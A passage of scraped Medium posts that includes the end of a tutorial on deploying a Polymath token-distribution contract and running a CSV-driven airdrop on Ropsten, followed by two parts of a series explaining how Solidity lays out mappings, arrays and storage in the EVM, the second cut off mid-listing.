port: 8545,      network_id: '*', // Match any network id      gas: 3500000,    },    ropsten: {      host: 'localhost',      port: 8545,      network_id: '3', // Match any network id      gas: 3500000,      gasPrice: 50000000000    },  },  solc: {    optimizer: {      enabled: true,      runs: 200,    },  },};The above will allow us to run truffle migrate --network ropsten to deploy the contracts to Ropsten testnet. Before being able to deploy the contracts to Ropsten we need to create the deployment script for truffle. Create a new file named 2_deploy_contracts.js inside the migrations folder with the following code:var PolyToken = artifacts.require('./PolyToken.sol');var PolyDistribution = artifacts.require('./PolyDistribution.sol');module.exports = async (deployer, network) => {  let _now = Date.now();  let _fromNow = 60 * 5 * 1000; // Start distribution in 1 hour  let _startTime = (_now + _fromNow) / 1000;  await deployer.deploy(PolyDistribution, _startTime);  console.log(`    ---------------------------------------------------------------    --------- POLYMATH (POLY) TOKEN SUCCESSFULLY DEPLOYED ---------    ---------------------------------------------------------------    - Contract address: ${PolyDistribution.address}    - Distribution starts in: ${_fromNow/1000/60} minutes    - Local Time: ${new Date(_now + _fromNow)}    ---------------------------------------------------------------  `);};The code above will be run when you execute truffle migrate --network ropsten\u00a0. It will deploy the PolyDistribution contract to Ropsten (which also handles the deployment of the POLY Token contract), setting the _startTime to five minutes from now. Make sure the_startTime variable is correctly set and that you attempt to do the airdrop once the _startTime has been reached, else the execution will fail. We are using _startTime to prevent people from withdrawing tokens before the token distribution event begins.Go ahead and run truffle migrate --network ropsten if everything went well you should see an output similar to this on the console:The tx hashes and contract address will be different for\u00a0you.If you don\u2019t see this output or you get an error make sure you are running Parity and that is fully synced. Also, make sure you have enough ether in the account being used to deploy the contracts on the Ropsten testnet.Take note of the address of the Poly Distribution contract we just deployed, we\u2019ll use it later.Reading the CSV\u00a0FileLet\u2019s start working on the script that will do the automatic allocation of POLY tokens to the addresses that signed up for the airdrop.First, create a new folder called scripts and create a new file inside this folder called csv_allocation.js This file will contain all the code for running the allocation process.Before we move forward with the code that reads the CSV file and processes it, let\u2019s add the file to the project. We need a 1 column CSV file named airdrop.csv that has an entry for each address that will receive tokens. Create this file and add it to the scripts/data folder.If you want to easily test the airdrop, you can generate this file yourself with \u201crandom\u201d addresses you control. One simple way to do that is to run testrpc and specify how many accounts you want to create, like so:testrpc -m \"word1 word2 word3...\" -a 300The command above will generate 300 accounts from the mnemonic you provide it with. Copy the addresses to airdrop.csv\u00a0.Back in our csv_allocation.js script, let\u2019s add the necessary code to be able to read the airdrop.csv. Add the following code to csv_allocation.js:var fs = require('fs');var csv = require('fast-csv');var BigNumber = require('bignumber.js');let polyDistributionAddress = process.argv.slice(2)[0];let BATCH_SIZE = process.argv.slice(2)[1];if(!BATCH_SIZE) BATCH_SIZE = 80;let distribData = new Array();let allocData = new Array();function readFile() {  var stream = fs.createReadStream(\"scripts/data/airdrop.csv\");let index = 0;let batch = 0;console.log(`    --------------------------------------------    --------- Parsing distrib.csv file ---------    --------------------------------------------******** Removing beneficiaries without address data  `);var csvStream = csv()      .on(\"data\", function(data){          let isAddress = web3.utils.isAddress(data[0]);          if(isAddress && data[0]!=null && data[0]!='' ){            allocData.push(data[0]);index++;            if(index >= BATCH_SIZE)            {              distribData.push(allocData);              allocData = [];              index = 0;            }}      })      .on(\"end\", function(){           //Add last remainder batch           distribData.push(allocData);           allocData = [];           setAllocation();      });  stream.pipe(csvStream);}if(polyDistributionAddress){  console.log(\"Processing airdrop. Batch size is\",BATCH_SIZE, \"accounts per transaction\");  readFile();}else{  console.log(\"Please run the script by providing the address of the PolyDistribution contract\");}You can now run the script by doing:$ node scripts/csv_allocation.js 0x0... 80// Where 0x0... is the address of the PolyDistribution contract we previously deployed to Ropsten.// 80 is the batch size we want to process. (How many accounts per array we want to process and send to the airdropTokens function) Can be omitted, defaults to 80.Let\u2019s review the code:First, we import the libraries that will allow us to read files and process the CSV file.Then, if you look at the last few lines of code, you will see we are accessing the parameters passed when running the script and, if there\u2019s the address of the PolyDistribution contract, we call the readFile() function.What the readFile() function does is accessing airdrop.csv file and it reads it line by line. At each line, we make sure that the value is not null or empty and we also use web3\u2019s isAddress() function to verify that the address passed is valid. If the address is ok, we add it to an array that holds the processed data we\u2019ll use to build each Ethereum transaction.\u00a0Once the data has been fully processed and we reach the end of file, we call the function that will take each array of 80 addresses and process them.Note that this function is very simplistic and could be further improved to detect token amounts that would exceed the POLY supply, duplicate addresses, etc. All of these cases are still taken care of on the contract side, but it would be nice if we could save us a few transaction calls to Ethereum.Processing the Token DistributionNow that we have our data processed into an array\u200a\u2014\u200aWe should have the array called distribData containing a handful of arrays, each with 80 addresses at most\u200a\u2014\u200awe are going to call the airdropTokens() function from the smart contract for each one of them.const delay = ms => new Promise(resolve => setTimeout(resolve, ms));async function setAllocation() {console.log(`    --------------------------------------------    ---------Performing allocations ------------    --------------------------------------------  `);let accounts = await web3.eth.getAccounts();let polyDistribution = await PolyDistribution.at(polyDistributionAddress);  for(var i = 0;i< distribData.length;i++){try{      let gPrice = 50000000000;      console.log(\"Attempting to allocate 250 POLYs to accounts:\",distribData[i],\"\\n\\n\");      let r = await polyDistribution.airdropTokens(distribData[i],{from:accounts[0], gas:4500000, gasPrice:gPrice});      console.log(\"---------- ---------- ---------- ----------\");      console.log(\"Allocation + transfer was successful.\", r.receipt.gasUsed, \"gas used. Spent:\",r.receipt.gasUsed * gPrice,\"wei\");      console.log(\"---------- ---------- ---------- ----------\\n\\n\")    } catch (err){      console.log(\"ERROR:\",err);    } }}Let\u2019s take a closer look at this function. What setAllocation() from the JS script does is simply traversing the distribData array we populated with the processed data from the csv file, then for each array of entries we proceed to execute airdropTokens() on the smart contract, passing the array.For each batch of addresses we process, we retrieve the event log and print how much gas was spent, just as a way to make sure the process succeeded.Every batch should spend about the same amount of gas. If there\u2019s a batch that costed less gas, it means that some of the addresses within that batch were not transferred tokens, probably because they had already been transferred tokens before.Reading the Transfer Event from the ERC20 Token to Verify the TransactionsOne last thing we can do before calling it a day is to access the event log for the ERC20 POLY token Transfer() function so we can quickly check how many accounts got their tokens.Add the following lines at the end of setAllocation() function:console.log(\"Distribution script finished successfully.\")  console.log(\"Waiting 2 minutes for transactions to be mined...\")  await delay(90000);  console.log(\"Retrieving logs to inform total amount of tokens distributed so far. This may take a while...\")let polytokenAddress = await polyDistribution.POLY({from:accounts[0]});  let polyToken = await PolyToken.at(polytokenAddress);var sumAccounts = 0;  var sumTokens = 0;var events = await polyToken.Transfer({from: polyDistribution.address},{fromBlock: 0, toBlock: 'latest'});  events.get(function(error, log) {      event_data = log;      //console.log(log);      for (var i=0; i<event_data.length;i++){          //let tokens = event_data[i].args.value.times(10 ** -18).toString(10);          //let addressB = event_data[i].args.to;          sumTokens += event_data[i].args.value.times(10 ** -18).toNumber();          sumAccounts +=1;          //console.log(`Distributed ${tokens} POLY to address ${addressB}`);}      console.log(`A total of ${sumTokens} POLY tokens have been distributed to ${sumAccounts} accounts so far.`);  });The code above adds a timeout so we give some time for the transactions to finish getting mined and then we get the Transfer() event for the POLY token, filtering the events by the from field which is the PolyDistribution contract.Then, we count the events and how many tokens were distributed. We can use that data to compare it with our original file. We could also list each address that got tokens, or add a function that compares the CSV file with the event log data, if we wanted to get fancy.Executing the\u00a0ScriptThat\u2019s it! Let\u2019s give the script a try. Run the following command:$ node scripts/csv_allocation.js 0x0...// Replace 0x0... with the address of the PolyDistribution contract you deployed to RopstenIf everything went well, you should see something like this on the console:And if you go to Etherscan and enter address of the PolyDistribution contract you deployed, you should see something like this:If you can see the Transfer() events for each account you had on your CSV file, then congrats!\u00a0You have successfully performed your airdrop!", "responses": "14"}, {"title": "Diving Into The Ethereum VM Part 3\u200a\u2014\u200aThe Hidden Costs of\u00a0Arrays", "author_name": "Howard", "link": "https://medium.com/@hayeah/diving-into-the-ethereum-vm-the-hidden-costs-of-arrays-28e119f04a9b?source=search_post", "post_date": "Aug 23, 2017", "readtime": "11 min read", "upvotes": "1.1K", "content": "Diving Into The Ethereum VM Part 3\u200a\u2014\u200aThe Hidden Costs of\u00a0ArraysHowardBlockedUnblockFollowFollowingAug 23, 2017Solidity provides familiar data structures seen in other programming languages. Aside from simple values like numbers and structs, there are data types that can expand dynamically as more data is added. The three main categories of these dynamic types are:Mappings: mapping(bytes32 => uint256), mapping(address => string), etc.Arrays: []uint256, []byte, etc.Byte arrays. Only two kinds: string, bytes.In Part II of this series we\u2019ve seen how simpler types with fixed sizes are represented in storage.Fundamental values: uint256, byte, etc.Fixed sized arrays: [10]uint8, [32]byte, bytes32Structs that combine the above types.Storage variables that have fixed sizes are laid out one after another in storage, packing as tightly as possible in chunks of 32 bytes.(If this seems unfamiliar, read Diving Into The Ethereum VM Part II\u200a\u2014\u200aStorage Cost)In this article we\u2019ll look into how Solidity supports more complex data structures. Arrays and mappings in Solidity may look familiar on the surface, but the way they are implemented gives them radically different performance characteristics.We\u2019ll start with mapping, which is the simplest of all three. It turns out that arrays and byte arrays are just mappings with fancier features.MappingLet\u2019s store a single value in a uint256 => uint256 mapping:pragma solidity ^0.4.11;contract C {    mapping(uint256 => uint256) items;    function C() {      items[0xC0FEFE] = 0x42;    }}Compile:solc --bin --asm --optimize c-mapping.solThe assembly:tag_2:  // Doesn't do anything. Should be optimized away.  0xc0fefe  0x0  swap1  dup2  mstore  0x20  mstore  // Storing 0x42 to the address 0x798...187c  0x42  0x79826054ee948a209ff4a6c9064d7398508d2c1909a392f899d301c6d232187c  sstoreWe can think of the EVM store as a key-value database, with each key limited to storing 32 bytes. Rather than using the key 0xC0FEFE directly, here the key is hashed to 0x798...187c, and the value 0x42 stored there. The hashing function used is the keccak256 (SHA256) function.In this example we don\u2019t see the keccak256 instruction itself because the optimizer had decided to precalculate the result and inline it in bytecode. We still see the vestige of this calculation, in the form of useless mstore instructions.Calculate The\u00a0AddressLet\u2019s use some Python code to hash 0xC0FEFE to 0x798...187c. If you'd like to follow along, you'll need Python 3.6, or install pysha3 to get the keccak_256 hash function.Define two helper functions:import binasciiimport sha3# Convert a number to 32 bytes array.def bytes32(i):    return binascii.unhexlify('%064x' % i)# Calculate the keccak256 hash of a 32 bytes array.def keccak256(x):    return sha3.keccak_256(x).hexdigest()To convert numbers to 32 bytes:>>> bytes32(1)b'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01'>>> bytes32(0xC0FEFE)b'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xc0\\xfe\\xfe'To concatenate two byte arrays together, use the + operator:>>> bytes32(1) + bytes32(2)b'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02'To calculate the keccak256 hash of some bytes:>>> keccak256(bytes(1))'bc36789e7a1e281436464229828f817d6612f7b477d66591ff96a9e064bcc98a'We now have enough to calculate 0x798...187c.The position of the store variable items is 0x0(since it is the first store variable). To get the address, concatenate the key 0xc0fefe with the position of items:# key = 0xC0FEFE, position = 0>>> keccak256(bytes32(0xC0FEFE) + bytes32(0))'79826054ee948a209ff4a6c9064d7398508d2c1909a392f899d301c6d232187c'The formula for calculating the storage address for a key is:keccak256(bytes32(key) + bytes32(position))Two MappingsLet\u2019s take the formula we have to calculate where values would be stored! Suppose we have a contract with two mappings:pragma solidity ^0.4.11;contract C {    mapping(uint256 => uint256) itemsA;    mapping(uint256 => uint256) itemsB;    function C() {      itemsA[0xAAAA] = 0xAAAA;      itemsB[0xBBBB] = 0xBBBB;    }}The position for itemsA position is 0, for key 0xAAAA:# key = 0xAAAA, position = 0>>> keccak256(bytes32(0xAAAA) + bytes32(0))'839613f731613c3a2f728362760f939c8004b5d9066154aab51d6dadf74733f3'The position for itemsB position is 1, for key 0xBBBB:# key = 0xBBBB, position = 1>>> keccak256(bytes32(0xBBBB) + bytes32(1))'34cb23340a4263c995af18b23d9f53b67ff379ccaa3a91b75007b010c489d395'Let\u2019s verify these calculations with the compiler:$ solc --bin --asm --optimize  c-mapping-2.solThe assembly:tag_2:  // ... Omit memory operations that could be optimized away  0xaaaa  0x839613f731613c3a2f728362760f939c8004b5d9066154aab51d6dadf74733f3  sstore  0xbbbb  0x34cb23340a4263c995af18b23d9f53b67ff379ccaa3a91b75007b010c489d395  sstoreAs expected.KECCAK256 in\u00a0AssemblyThe compiler was able to pre-calculate the address for a key because the values involved are constants. If the key used is a variable, then the hashing needs to be done with assembly code. Now we want to disable this optimization so we can see how hashing is done in assembly.It turns out to be easy to cripple the optimizer, by introducing an extra indirection with a dummy variable i:pragma solidity ^0.4.11;contract C {    mapping(uint256 => uint256) items;    // This variable causes constant folding to fail.    uint256 i = 0xC0FEFE;    function C() {      items[i] = 0x42;    }}The position for the variable items is still 0x0, so we should expect the same address as before.Compile with optimization, but this time without the hash pre-calculation:$ solc --bin --asm --optimize  c-mapping--no-constant-folding.solThe assembly annotated:tag_2:  // Load `i` onto the stack  sload(0x1)    [0xC0FEFE]  // Store the key `0xC0FEFE` in memory at 0x0, for hashing.  0x0    [0x0 0xC0FEFE]  swap1    [0xC0FEFE 0x0]  dup2    [0x0 0xC0FEFE 0x0]  mstore    [0x0]    memory: {      0x00 => 0xC0FEFE    }  // Store the position `0x0` in memory at 0x20 (32), for hashing.  0x20 // 32    [0x20 0x0]  dup2    [0x0 0x20 0x0]  swap1    [0x20 0x0 0x0]  mstore    [0x0]    memory: {      0x00 => 0xC0FEFE      0x20 => 0x0    }  // Starting at 0th byte, hash the next 0x40 (64) bytes in memory  0x40 // 64    [0x40 0x0]  swap1    [0x0 0x40]  keccak256    [0x798...187c]  // Store 0x42 at the calculated address  0x42    [0x42 0x798...187c]  swap1    [0x798...187c 0x42]  sstore    store: {      0x798...187c => 0x42    }The mstore instruction writes 32 bytes in memory. The memory is much cheaper, costing only 3 gas to read and write. The first half of the assembly \"concatenates\" the key and position by loading them into neighbouring chunks of memory: 0                   31  32                 63[    key (32 bytes)    ][ position (32 bytes) ]Then the keccak256 instruction hashes the data in that memory region. The cost depends on how much data is hashed:30 Paid for each SHA3 operation.6 Paid for each word of 32 bytes.For an uint256 key the gas cost is 42 (30 + 6 * 2).Mapping Large\u00a0ValuesEach storage slot can only store 32 bytes. What happens if we try to store a struct that\u2019s larger?pragma solidity ^0.4.11;contract C {    mapping(uint256 => Tuple) tuples;    struct Tuple {      uint256 a;      uint256 b;      uint256 c;    }    function C() {      tuples[0x1].a = 0x1A;      tuples[0x1].b = 0x1B;      tuples[0x1].c = 0x1C;    }}Compile, and you should see 3 sstore instructions:tag_2:  // ...omitting unoptimized code  0x1a  0xada5013122d395ba3c54772283fb069b10426056ef8ca54750cb9bb552a59e7d  sstore  0x1b  0xada5013122d395ba3c54772283fb069b10426056ef8ca54750cb9bb552a59e7e  sstore  0x1c  0xada5013122d395ba3c54772283fb069b10426056ef8ca54750cb9bb552a59e7f  sstoreNotice that the calculated addresses are the same except for the last digit. The member fields of the Tuple struct are laid out one after another (..7d,\u00a0..7e,\u00a0..7f).Mappings Don\u2019t\u00a0PackGiven how mapping is designed, the minimal amount of storage you pay per item is 32 bytes, even if you are only storing 1 byte:pragma solidity ^0.4.11;contract C {    mapping(uint256 => uint8) items;    function C() {      items[0xA] = 0xAA;      items[0xB] = 0xBB;    }}And if a value is larger than 32 bytes, you pay for storage in increments of 32 bytes.Dynamic Arrays Are Mappings++In a typical language, an array is just a list of items that sit together in memory. Say you have an array that contains 100 uint8 elements, then it would occupy 100 bytes of memory. In this scheme, it\u2019s cheap to load the whole array in bulk onto CPU cache, and to loop through the items.For most languages, arrays are cheaper than maps. For Solidity, though, array is a more expensive version of mapping. Items of an array would be laid out sequentially in storage, like:0x290d...e5630x290d...e5640x290d...e5650x290d...e566But keep in mind, each access to these storage slots is in fact a key-value lookup in a database. Accessing an array element is no different from accessing a mapping element.Consider the type []uint256, it is essentially the same as mapping(uint256 => uint256) with added features making it \"array-like\":length to indicate how many items there are.Bound-checking. Throws error when reading & writing to an index larger than the length.More sophisticated storage packing behaviour than mapping.Automatic zeroing out of unused storage slots when an array is shrunk.Special optimization for bytes and string to make short arrays (less than 31 bytes) more storage efficient.Simple ArrayLet\u2019s look at an array that stores three items:// c-darray.solpragma solidity ^0.4.11;contract C {    uint256[] chunks;    function C() {      chunks.push(0xAA);      chunks.push(0xBB);      chunks.push(0xCC);    }}The assembly code for array access is too complex to trace. Let\u2019s use the Remix debugger to run the contract:At the end of the simulation, we can see that 4 storage slots are used:key: 0x0000000000000000000000000000000000000000000000000000000000000000value: 0x0000000000000000000000000000000000000000000000000000000000000003key: 0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e563value: 0x00000000000000000000000000000000000000000000000000000000000000aakey: 0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e564value: 0x00000000000000000000000000000000000000000000000000000000000000bbkey: 0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e565value: 0x00000000000000000000000000000000000000000000000000000000000000ccThe position of the chunks variable is 0x0, which is used to store the array's length (0x3). Hash the variable's position to find the address for storing array data:# position = 0>>> keccak256(bytes32(0))'290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e563'Each item of the array is laid out sequentially from this address (0x29..63, 0x29..64, 0x29..65).Dynamic Array\u00a0PackingHow about the all important packing behaviour? One advantage of array over mapping is that packing works. Four items of an uint128[] array would fit in exactly two storage slots (plus 1 for storing the length).Consider:pragma solidity ^0.4.11;contract C {    uint128[] s;    function C() {        s.length = 4;        s[0] = 0xAA;        s[1] = 0xBB;        s[2] = 0xCC;        s[3] = 0xDD;    }}Run this in Remix, and the storage at the end looks like:key: 0x0000000000000000000000000000000000000000000000000000000000000000value: 0x0000000000000000000000000000000000000000000000000000000000000004key: 0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e563value: 0x000000000000000000000000000000bb000000000000000000000000000000aakey: 0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e564value: 0x000000000000000000000000000000dd000000000000000000000000000000ccOnly 3 slots are used, as expected. The length is again stored at 0x0, the position of the storage variable. Four items are packed in two separate storage slots. The starting address for this array is the hash of the position of the variable:# position = 0>>> keccak256(bytes32(0))'290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e563'The address now increments once for every two array elements. Looks good!But the assembly code itself is not very well optimized. Since only two storage slots are used, we would hope that the optimizer uses two sstore for the assignments. Unfortunately with bound-checking (and some other stuff) thrown in, it's not possible to optimize the sstore instructions away.Four sstore instructions are used for the assignments:/* \"c-bytes--sstore-optimize-fail.sol\":105:116  s[0] = 0xAA */sstore/* \"c-bytes--sstore-optimize-fail.sol\":126:137  s[1] = 0xBB */sstore/* \"c-bytes--sstore-optimize-fail.sol\":147:158  s[2] = 0xCC */sstore/* \"c-bytes--sstore-optimize-fail.sol\":168:179  s[3] = 0xDD */sstoreByte Arrays &\u00a0Stringbytes and string are special array types that optimize for bytes and characters respectively. If the length of the array is less than 31 bytes, only one storage slot is used to store the whole thing. Longer byte arrays are represented in much the same way as normal arrays.Let\u2019s see a short byte array in action:// c-bytes--long.solpragma solidity ^0.4.11;contract C {    bytes s;    function C() {        s.push(0xAA);        s.push(0xBB);        s.push(0xCC);    }}Since the array is only 3 bytes (less than 31 bytes), it occupies just one storage slot. Run in Remix, the storage:key: 0x0000000000000000000000000000000000000000000000000000000000000000value: 0xaabbcc0000000000000000000000000000000000000000000000000000000006The data 0xaabbcc... is stored from left to right. The 0's that follow are empty data. The last byte 0x06 is the encoded length of the array. The formula is encodedLength / 2 = length. In this case the actual length is6 / 2 = 3.A string works in exactly the same way.A Long Byte\u00a0ArrayIf the amount of data is greater than 31 bytes, a byte array is like []byte. Let look at byte array that's 128 bytes long:// c-bytes--long.solpragma solidity ^0.4.11;contract C {    bytes s;    function C() {        s.length = 32 * 4;        s[31] = 0x1;        s[63] = 0x2;        s[95] = 0x3;        s[127] = 0x4;    }}Run in Remix, and we see that four slots are used in storage:0x0000...00000x0000...01010x290d...e5630x0000...00010x290d...e5640x0000...00020x290d...e5650x0000...00030x290d...e5660x0000...0004The slot 0x0 is no longer used to store data. The whole slot now stores the encoded array length. To get the actual length, do length = (encodedLength - 1) / 2. In this case the length is128 = (0x101 - 1) / 2. The actual bytes are stored in0x290d...e563, and the slots that follow sequentially.The assembly code for byte array is quite big. Aside from the normal bound-checking and array resizing stuff, it also needs to encode/decode length, as well as taking care to convert between long and short byte arrays.Why encode the length? Because the way it\u2019s done, there\u2019s a simple way to test if a byte array is short or long. Notice that the encoded length is always odd for a long array, and even for a short array. The assembly only needs to look at the last bit to see whether it is zero (even/short) or non-zero (odd/long).ConclusionPeeking into the inner workings of the Solidity compiler, we see that familiar data structures like mappings and arrays are radically different from conventional programming languages.To recap:Arrays are like mappings, not very efficient.More complex assembly code than mappings.Better storage efficiency than mapping for smaller types (byte, uint8, string).Assembly not optimized very well. Even with packing, there\u2019s one sstore per assignment.The EVM storage is a key-value database, much like git. If you change anything, the checksum at the root node would change. If two root nodes have the same checksum, the stored data is guaranteed to be the same.To appreciate how quirky Solidity & EVM is, imagine that each element of the array is its own file in a git repository. When you change the value of an array element, you are in fact creating a git commit. When iterating through an array, you can\u2019t load the whole array at once, you have to look into the repository and find each file separately.Not only that, each file is limited to 32 bytes! Because we need to chop up data structures into 32 bytes chunks, Solidity\u2019s compiler is complicated by all kinds of logic and optimization tricks, all done in assembly.Yet the 32 bytes limit is entirely arbitrary. The backing key-value store can store any number of bytes with a key. Perhaps in the future we could add a new EVM instruction to store arbitrary bytes with a key.For now, the EVM storage is a key-value database prentending to be a 32 bytes array.See ArrayUtils::resizeDynamicArray for a taste of what the compiler is up to when resizing an array. Normally data structures would be done in the language as part of a standard library, but in Solidity it\u2019s baked into the compiler.If you enjoyed this article, you should follow me on Twitter @hayeah.", "responses": "3"}, {"title": "Diving Into The Ethereum VM Part 2\u200a\u2014\u200aHow I Learned To Start Worrying And Count The Storage\u00a0Cost", "author_name": "Howard", "link": "https://medium.com/@hayeah/diving-into-the-ethereum-vm-part-2-storage-layout-bc5349cb11b7?source=search_post", "post_date": "Aug 14, 2017", "readtime": "9 min read", "upvotes": "1K", "content": "Diving Into The Ethereum VM Part 2\u200a\u2014\u200aHow I Learned To Start Worrying And Count The Storage\u00a0CostHowardBlockedUnblockFollowFollowingAug 14, 2017Micron MT4C1024In the first article of this series we\u2019ve peeked into the assembly code of a simple Solidity contract:contract C {    uint256 a;    function C() {      a = 1;    }}This contract boils down to an invocation of the sstore instruction:// a = 1sstore(0x0, 0x1)The EVM stores the value 0x1 in the storage position 0x0.Each storage position can store exactly 32 bytes (or 256 bits).If this seems unfamiliar, I recommend reading: Diving Into The Ethereum VM Part 1\u200a\u2014\u200aAssembly & BytecodeIn this article we\u2019ll start to look into how Solidity uses chunks of 32 bytes to represent more complex data types like structs and arrays. We\u2019ll also see how storage could be optimized, and how optimization could fail.In a typical programming language it\u2019s not terribly useful to understand how data types are represented at such a low-level. In Solidity (or any EVM language) this knowledge is crucial because storage access is super expensive:sstore costs 20000 gas, or ~5000x more expensive than a basic arithmetic instruction.sload costs 200 gas, or ~100x more expensive than a basic arithmetic instruction.And by \u201ccost\u201d, we are talking about real money here, not just milliseconds of performance. The cost of running & using your contract is likely to be dominated by sstore and sload!Parsecs Upon Parsecs of\u00a0TapeTuring Machine. Source: http://raganwald.com/It takes two essential ingredients to build an Universal Computation Machine:A way to loop, either jump or recursion.An infinite amount of memory.The EVM assembly code has jump, and the EVM storage provides the infinite memory. That\u2019s enough for EVERYTHING, including simulating a world that runs a version of Ethereum, which is itself simulating a world that runs Ethereum that is\u2026Diving Into The Microverse BatteryThe EVM storage for a contract is like an infinite ticker tape, and each slot of the tape holds 32 bytes. Like this:[32 bytes][32 bytes][32 bytes]...We\u2019ll see how data lives on the infinite tape.The length of the tape is 2\u00b2\u2075\u2076, or ~10\u2077\u2077 storage slots per contract. The number of particles of the observable universe is 10\u2078\u2070. About 1000 contracts would be enough to hold all those protons, neutrons, and electrons. Don\u2019t believe the marketing hype, as it is a lot shorter than infinity.The Blank\u00a0TapeThe storage is initially blank, defaulting to zero. It doesn\u2019t cost you anything to have an infinite tape.Let\u2019s look at a simple contract to illustrate the zero-value behaviour:pragma solidity ^0.4.11;contract C {    uint256 a;    uint256 b;    uint256 c;    uint256 d;    uint256 e;    uint256 f;    function C() {      f = 0xc0fefe;    }}The layout in storage is simple.The variable a in position 0x0The variable b in position 0x1And so on\u2026The key question: if we only use f, how much do we pay for a, b, c, d, e?Let\u2019s compile and see:$ solc --bin --asm --optimize c-many-variables.solThe assembly:// sstore(0x5, 0xc0fefe)tag_2:  0xc0fefe  0x5  sstoreSo a storage variable declaration doesn\u2019t cost anything, as there\u2019s no initialization necessary. Solidity reserves a position for that store variable, and you pay only when you store something in it.In this case, we are only paying for storing to 0x5.If we were writing assembly by hand, we could choose any storage position without having to \u201cexpand\u201d the storage:// Writing to an arbitrary positionsstore(0xc0fefe, 0x42)Reading ZeroNot only can you write anywhere in storage, you can read from anywhere immediately. Reading from an uninitialized position simply returns 0x0.Let\u2019s see a contract that reads from a, an uninitialized position:pragma solidity ^0.4.11;contract C {    uint256 a;    function C() {      a = a + 1;    }}Compile:$ solc --bin --asm --optimize c-zero-value.solThe assembly:tag_2:  // sload(0x0) returning 0x0  0x0  dup1  sload  // a + 1; where a == 0  0x1  add  // sstore(0x0, a + 1)  swap1  sstoreNotice that it\u2019s valid to generate code that sload from an uninitialized position.We can be smarter than the Solidity compiler, however. Since we know that tag_2 is the constructor, and a had never been written to, we can replace the sload sequence with 0x0 to save 5000 gas.Representing StructLet\u2019s look at our first complex data type, a struct that has 6 fields:pragma solidity ^0.4.11;contract C {    struct Tuple {      uint256 a;      uint256 b;      uint256 c;      uint256 d;      uint256 e;      uint256 f;    }    Tuple t;    function C() {      t.f = 0xC0FEFE;    }}The layout in storage is the same as state variables:The field t.a in position 0x0The field t.b in position 0x1And so on\u2026Like before, we can write directly to t.f without paying for initialization.Let\u2019s compile:$ solc --bin --asm --optimize c-struct-fields.solAnd we see the exact same assembly:tag_2:  0xc0fefe  0x5  sstoreFixed Length\u00a0ArrayNow let\u2019s declare a fixed length array:pragma solidity ^0.4.11;contract C {    uint256[6] numbers;    function C() {      numbers[5] = 0xC0FEFE;    }}Since the compiler knows exactly how many uint256 (32 bytes) there are, it can simply lay out the elements of the array in storage one after another, just as it did for store variables and structs.In this contract, we are again storing to the position 0x5.Compile:$ solc --bin --asm --optimize c-static-array.solThe assembly:tag_2:  0xc0fefe  0x0  0x5tag_4:  add  0x0tag_5:  pop  sstoreIt is slight longer, but if you squint a little, you\u2019d see that it\u2019s actually the same. Let\u2019s optimize this further by hand:tag_2:  0xc0fefe  // 0+5. Replace with 0x5  0x0  0x5  add  // Push then pop immediately. Useless, just remove.  0x0  pop  sstoreRemoving the tags and spurious instructions, we arrive at the same bytecode sequence again:tag_2:  0xc0fefe  0x5  sstoreArray Bound\u00a0CheckingWe\u2019ve seen that fixed-length arrays has the same storage layout as struct and state variables, but the generated assembly code is different. The reason is that Solidity generates bound-checking for array access.Let\u2019s compile the array contract again, turning off the optimizations this time:$ solc --bin --asm c-static-array.solThe assembly is commented below, printing the machine state after each instruction:tag_2:  0xc0fefe    [0xc0fefe]  0x5    [0x5 0xc0fefe]  dup1  /* array bound checking code */  // 5 < 6  0x6    [0x6 0x5 0xc0fefe]  dup2    [0x5 0x6 0x5 0xc0fefe]  lt    [0x1 0x5 0xc0fefe]  // bound_check_ok = 1 (TRUE)  // if(bound_check_ok) { goto tag5 } else { invalid }  tag_5    [tag_5 0x1 0x5 0xc0fefe]  jumpi    // Test condition is true. Will goto tag_5.    // And `jumpi` consumes two items from stack.    [0x5 0xc0fefe]  invalid// Array access is valid. Do it.// stack: [0x5 0xc0fefe]tag_5:  sstore    []    storage: { 0x5 => 0xc0fefe }We see the the bound-checking code now. We\u2019ve seen that the compiler is able to optimize some of this stuff, but not perfectly.Later in this article we will to see how array bound-checking interferes with compiler optimization, making fixed-length arrays much less efficient than store variables or structs.Packing BehaviourStorage is expensive (yayaya I\u2019ve said it a million times). One key optimization is to pack as much data into one 32 bytes slot as possible.Consider a contract that has four store variables, 64 bits each, adding up to 256 bits (32 bytes) altogether:pragma solidity ^0.4.11;contract C {    uint64 a;    uint64 b;    uint64 c;    uint64 d;    function C() {      a = 0xaaaa;      b = 0xbbbb;      c = 0xcccc;      d = 0xdddd;    }}We\u2019d expect (hope) that the compiler uses one sstore to put these in the same storage slot.Compile:$ solc --bin --asm --optimize c-many-variables--packing.solThe assembly:tag_2:    /* \"c-many-variables--packing.sol\":121:122  a */  0x0    /* \"c-many-variables--packing.sol\":121:131  a = 0xaaaa */  dup1  sload    /* \"c-many-variables--packing.sol\":125:131  0xaaaa */  0xaaaa  not(0xffffffffffffffff)    /* \"c-many-variables--packing.sol\":121:131  a = 0xaaaa */  swap1  swap2  and  or  not(sub(exp(0x2, 0x80), exp(0x2, 0x40)))    /* \"c-many-variables--packing.sol\":139:149  b = 0xbbbb */  and  